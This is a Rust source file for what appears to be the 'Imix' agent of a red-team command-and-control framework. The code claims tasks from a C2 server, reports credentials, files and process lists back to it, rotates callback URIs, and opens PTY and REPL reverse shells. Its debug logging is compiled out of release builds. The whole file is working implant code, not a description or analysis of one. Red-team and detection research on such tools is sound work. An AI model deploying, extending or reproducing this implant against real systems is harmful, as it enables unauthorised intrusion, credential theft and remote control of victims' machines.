use anyhow::{Context, Result};
use eldritch_libagent::agent::Agent;
use eldritchv2::pivot::ReplHandler;
use pb::c2::{self, ClaimTasksRequest};
use pb::config::Config;
use std::collections::{BTreeMap, BTreeSet};
use std::sync::{Arc, Mutex};
use tokio::sync::RwLock;
use transport::{Transport, SyncTransport};
use std::sync::mpsc::{Receiver, Sender};

use crate::task::TaskRegistry;
use crate::shell::{run_repl_reverse_shell, run_reverse_shell_pty};

#[derive(Clone)]
pub struct ImixAgent<T: Transport> {
    config: Arc<RwLock<Config>>,
    pub transport: Arc<RwLock<T>>,
    callback_uris: Arc<RwLock<Vec<String>>>,
    active_uri_idx: Arc<RwLock<usize>>,
    runtime_handle: tokio::runtime::Handle,
    pub task_registry: Arc<TaskRegistry>,
    pub subtasks: Arc<Mutex<BTreeMap<i64, tokio::task::JoinHandle<()>>>>,
    pub output_buffer: Arc<Mutex<Vec<c2::ReportTaskOutputRequest>>>,
}

struct ImixSyncTransport<T: Transport> {
    agent: Arc<ImixAgent<T>>,
}

impl<T: Transport + Sync + Send + 'static> SyncTransport for ImixSyncTransport<T> {
    fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>> {
        self.agent.with_transport(|mut t| async move {
            let (tx, rx) = std::sync::mpsc::channel();
            t.fetch_asset(req, tx).await?;
            let mut data = Vec::new();
            while let Ok(resp) = rx.recv() {
                data.extend(resp.chunk);
            }
            Ok(data)
        }).map_err(|e| anyhow::anyhow!(e))
    }

    fn report_credential(&self, req: c2::ReportCredentialRequest) -> Result<c2::ReportCredentialResponse> {
        self.agent.with_transport(|mut t| async move { t.report_credential(req).await })
            .map_err(|e| anyhow::anyhow!(e))
    }

    fn report_file(&self, req: c2::ReportFileRequest) -> Result<c2::ReportFileResponse> {
        self.agent.with_transport(|mut t| async move {
            let (tx, rx) = std::sync::mpsc::channel();
            tx.send(req)?;
            drop(tx);
            t.report_file(rx).await
        }).map_err(|e| anyhow::anyhow!(e))
    }

    fn report_process_list(&self, req: c2::ReportProcessListRequest) -> Result<c2::ReportProcessListResponse> {
        self.agent.with_transport(|mut t| async move { t.report_process_list(req).await })
            .map_err(|e| anyhow::anyhow!(e))
    }

    fn report_task_output(&self, req: c2::ReportTaskOutputRequest) -> Result<c2::ReportTaskOutputResponse> {
        self.agent.buffer_task_output(req).map_err(|e| anyhow::anyhow!(e))?;
        Ok(c2::ReportTaskOutputResponse {})
    }

    fn reverse_shell(&self, rx: Receiver<c2::ReverseShellRequest>, tx: Sender<c2::ReverseShellResponse>) -> Result<()> {
        let agent = self.agent.clone();
        self.agent.runtime_handle.spawn(async move {
            let transport_result = agent.get_usable_transport().await;
            match transport_result {
                Ok(mut t) => {
                    let (tokio_tx_req, tokio_rx_req) = tokio::sync::mpsc::channel(32);
                    let (tokio_tx_resp, mut tokio_rx_resp) = tokio::sync::mpsc::channel(32);
                    let rx_bridge = tokio::task::spawn_blocking(move || {
                        while let Ok(msg) = rx.recv() {
                            if tokio_tx_req.blocking_send(msg).is_err() { break; }
                        }
                    });
                    let tx_bridge = tokio::spawn(async move {
                        while let Some(msg) = tokio_rx_resp.recv().await {
                            if tx.send(msg).is_err() { break; }
                        }
                    });
                    if let Err(_e) = t.reverse_shell(tokio_rx_req, tokio_tx_resp).await {
                        #[cfg(debug_assertions)]
                        log::error!("Transport reverse_shell error: {_e}");
                    }
                    rx_bridge.abort();
                    tx_bridge.abort();
                }
                Err(e) => {
                    #[cfg(debug_assertions)]
                    log::error!("Failed to get transport for reverse shell: {e}");
                }
            }
        });
        Ok(())
    }

    fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse> {
        self.agent.with_transport(|mut t| async move { t.claim_tasks(req).await })
            .map_err(|e| anyhow::anyhow!(e))
    }
}

impl<T: Transport + Sync + Send + 'static> ImixAgent<T> {
    pub fn new(
        config: Config,
        transport: T,
        runtime_handle: tokio::runtime::Handle,
        task_registry: Arc<TaskRegistry>,
    ) -> Self {
        let uri = config.callback_uri.clone();
        Self {
            config: Arc::new(RwLock::new(config)),
            transport: Arc::new(RwLock::new(transport)),
            callback_uris: Arc::new(RwLock::new(vec![uri])),
            active_uri_idx: Arc::new(RwLock::new(0)),
            runtime_handle,
            task_registry,
            subtasks: Arc::new(Mutex::new(BTreeMap::new())),
            output_buffer: Arc::new(Mutex::new(Vec::new())),
        }
    }

    pub fn get_callback_interval_u64(&self) -> Result<u64> {
        let cfg = self.config.try_read().map_err(|_| anyhow::anyhow!("Failed to acquire read lock on config"))?;
        let info = cfg.info.as_ref().ok_or_else(|| anyhow::anyhow!("No beacon info in config"))?;
        Ok(info.interval)
    }

    pub async fn refresh_ip(&self) {
        let mut cfg = self.config.write().await;
        cfg.refresh_primary_ip();
    }

    pub async fn update_transport(&self, t: T) {
        let mut transport = self.transport.write().await;
        *transport = t;
    }

    pub async fn flush_outputs(&self) {
        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
        let outputs: Vec<_> = {
            match self.output_buffer.lock() {
                Ok(mut b) => b.drain(..).collect(),
                Err(_) => return,
            }
        };
        if outputs.is_empty() { return; }
        let mut transport = self.transport.write().await;
        for output in outputs {
            if let Err(_e) = transport.report_task_output(output).await {
                #[cfg(debug_assertions)]
                log::error!("Failed to report task output: {_e}");
            }
        }
    }

    pub fn buffer_task_output(&self, req: c2::ReportTaskOutputRequest) -> Result<(), String> {
        let mut buffer = self.output_buffer.lock().map_err(|e| e.to_string())?;
        buffer.push(req);
        Ok(())
    }

    pub async fn get_transport_config(&self) -> (String, Option<String>) {
        let uris = self.callback_uris.read().await;
        let idx = *self.active_uri_idx.read().await;
        let callback_uri = if idx < uris.len() { uris[idx].clone() } else { uris.first().cloned().unwrap_or_default() };
        let cfg = self.config.read().await;
        (callback_uri, cfg.proxy_uri.clone())
    }

    pub async fn rotate_callback_uri(&self) {
        let uris = self.callback_uris.read().await;
        let mut idx = self.active_uri_idx.write().await;
        if !uris.is_empty() { *idx = (*idx + 1) % uris.len(); }
    }

    async fn get_usable_transport(&self) -> Result<T> {
        {
            let guard = self.transport.read().await;
            if guard.is_active() { return Ok(guard.clone()); }
        }
        let (callback_uri, proxy_uri) = self.get_transport_config().await;
        let t = T::new(callback_uri, proxy_uri).context("Failed to create on-demand transport")?;
        #[cfg(debug_assertions)]
        log::debug!("Created on-demand transport for background task");
        Ok(t)
    }

    pub async fn claim_tasks(&self) -> Result<Vec<pb::c2::Task>> {
        let mut transport = self.transport.write().await;
        let beacon_info = self.config.read().await.info.clone();
        let req = ClaimTasksRequest { beacon: beacon_info };
        let response = transport.claim_tasks(req).await.context("Failed to claim tasks")?;
        Ok(response.tasks)
    }

    fn block_on<F, R>(&self, future: F) -> Result<R, String> where F: std::future::Future<Output = Result<R, String>> {
        self.runtime_handle.block_on(future)
    }

    pub fn get_sync_transport(&self) -> Arc<dyn SyncTransport> {
        Arc::new(ImixSyncTransport { agent: Arc::new(self.clone()) })
    }

    fn with_transport<F, Fut, R>(&self, action: F) -> Result<R, String> where F: FnOnce(T) -> Fut, Fut: std::future::Future<Output = Result<R, anyhow::Error>> {
        self.block_on(async {
            let t = self.get_usable_transport().await.map_err(|e| e.to_string())?;
            action(t).await.map_err(|e| e.to_string())
        })
    }

    fn spawn_subtask<F, Fut>(&self, task_id: i64, action: F) -> Result<(), String> where F: FnOnce(T) -> Fut + Send + 'static, Fut: std::future::Future<Output = Result<()>> + Send + 'static {
        let subtasks = self.subtasks.clone();
        let agent = self.clone();
        let handle = self.runtime_handle.spawn(async move {
            match agent.get_usable_transport().await {
                Ok(transport) => {
                    if let Err(_e) = action(transport).await {
                        #[cfg(debug_assertions)]
                        log::error!("Subtask {} error: {_e:#}", task_id);
                    }
                }
                Err(_e) => {
                    #[cfg(debug_assertions)]
                    log::error!("Subtask {} failed to get transport: {_e:#}", task_id);
                }
            }
        });
        if let Ok(mut map) = subtasks.lock() { map.insert(task_id, handle); }
        Ok(())
    }
}

impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
    fn get_config(&self) -> Result<BTreeMap<String, String>, String> {
        let mut map = BTreeMap::new();
        let cfg = self.block_on(async { Ok(self.config.read().await.clone()) }).map_err(|e: String| e)?;
        let active_uri = self.get_active_callback_uri().unwrap_or_default();
        map.insert("callback_uri".to_string(), active_uri);
        if let Some(proxy) = &cfg.proxy_uri { map.insert("proxy_uri".to_string(), proxy.clone()); }
        map.insert("retry_interval".to_string(), cfg.retry_interval.to_string());
        map.insert("run_once".to_string(), cfg.run_once.to_string());
        if let Some(info) = &cfg.info {
            map.insert("beacon_id".to_string(), info.identifier.clone());
            map.insert("principal".to_string(), info.principal.clone());
            map.insert("interval".to_string(), info.interval.to_string());
            if let Some(host) = &info.host {
                map.insert("hostname".to_string(), host.name.clone());
                map.insert("platform".to_string(), host.platform.to_string());
                map.insert("primary_ip".to_string(), host.primary_ip.clone());
            }
        }
        Ok(map)
    }
    fn get_transport(&self) -> Result<String, String> { self.block_on(async { Ok(self.transport.read().await.name().to_string()) }) }
    fn set_transport(&self, transport: String) -> Result<(), String> {
        let available = self.list_transports()?;
        if !available.contains(&transport) { return Err(format!("Invalid transport: {}", transport)); }
        self.block_on(async {
            let mut uris = self.callback_uris.write().await;
            let idx_val = *self.active_uri_idx.read().await;
            if idx_val < uris.len() {
                let current_uri = &uris[idx_val];
                if let Some(pos) = current_uri.find("://") {
                    let new_uri = format!("{}://{}", transport, &current_uri[pos + 3..]);
                    uris[idx_val] = new_uri;
                } else {
                    let new_uri = format!("{}://{}", transport, current_uri);
                    uris[idx_val] = new_uri;
                }
            }
            Ok(())
        })
    }
    fn list_transports(&self) -> Result<Vec<String>, String> { self.block_on(async { Ok(self.transport.read().await.list_available()) }) }
    fn get_callback_interval(&self) -> Result<u64, String> { self.get_callback_interval_u64().map_err(|e| e.to_string()) }
    fn set_callback_interval(&self, interval: u64) -> Result<(), String> {
        self.block_on(async {
            let mut cfg = self.config.write().await;
            if let Some(info) = &mut cfg.info { info.interval = interval; }
            Ok(())
        })
    }
    fn set_callback_uri(&self, uri: String) -> Result<(), String> { self.set_active_callback_uri(uri) }
    fn list_callback_uris(&self) -> Result<BTreeSet<String>, String> {
        self.block_on(async {
            let uris = self.callback_uris.read().await;
            Ok(uris.iter().cloned().collect())
        })
    }
    fn get_active_callback_uri(&self) -> Result<String, String> {
        self.block_on(async {
            let uris = self.callback_uris.read().await;
            let idx = *self.active_uri_idx.read().await;
            if idx < uris.len() { Ok(uris[idx].clone()) } else { uris.first().cloned().ok_or_else(|| "No callback URIs configured".to_string()) }
        })
    }
    fn get_next_callback_uri(&self) -> Result<String, String> {
        self.block_on(async {
            let uris = self.callback_uris.read().await;
            let idx = *self.active_uri_idx.read().await;
            if uris.is_empty() { return Err("No callback URIs configured".to_string()); }
            let next_idx = (idx + 1) % uris.len();
            Ok(uris[next_idx].clone())
        })
    }
    fn add_callback_uri(&self, uri: String) -> Result<(), String> {
        self.block_on(async {
            let mut uris = self.callback_uris.write().await;
            if !uris.contains(&uri) { uris.push(uri); }
            Ok(())
        })
    }
    fn remove_callback_uri(&self, uri: String) -> Result<(), String> {
        self.block_on(async {
            let mut uris = self.callback_uris.write().await;
            if let Some(pos) = uris.iter().position(|x| *x == uri) {
                uris.remove(pos);
                let mut idx = self.active_uri_idx.write().await;
                if *idx >= uris.len() && !uris.is_empty() { *idx = 0; }
            }
            Ok(())
        })
    }
    fn set_active_callback_uri(&self, uri: String) -> Result<(), String> {
        self.block_on(async {
            let mut uris = self.callback_uris.write().await;
            let mut idx = self.active_uri_idx.write().await;
            if let Some(pos) = uris.iter().position(|x| *x == uri) { *idx = pos; } else { uris.push(uri); *idx = uris.len() - 1; }
            Ok(())
        })
    }
    fn list_tasks(&self) -> Result<Vec<c2::Task>, String> { Ok(self.task_registry.list()) }
    fn stop_task(&self, task_id: i64) -> Result<(), String> {
        self.task_registry.stop(task_id);
        let mut map = self.subtasks.lock().map_err(|_| "Poisoned lock".to_string())?;
        if let Some(handle) = map.remove(&task_id) {
            handle.abort();
            #[cfg(debug_assertions)]
            log::info!("Aborted subtask {task_id}");
        }
        Ok(())
    }
}

impl<T: Transport + Send + Sync + 'static> ReplHandler for ImixAgent<T> {
    fn start_repl_reverse_shell(&self, task_id: i64) -> Result<(), String> {
        let agent = self.clone();
        self.spawn_subtask(task_id, move |transport| async move {
            run_repl_reverse_shell(task_id, transport, agent).await
        })
    }
}
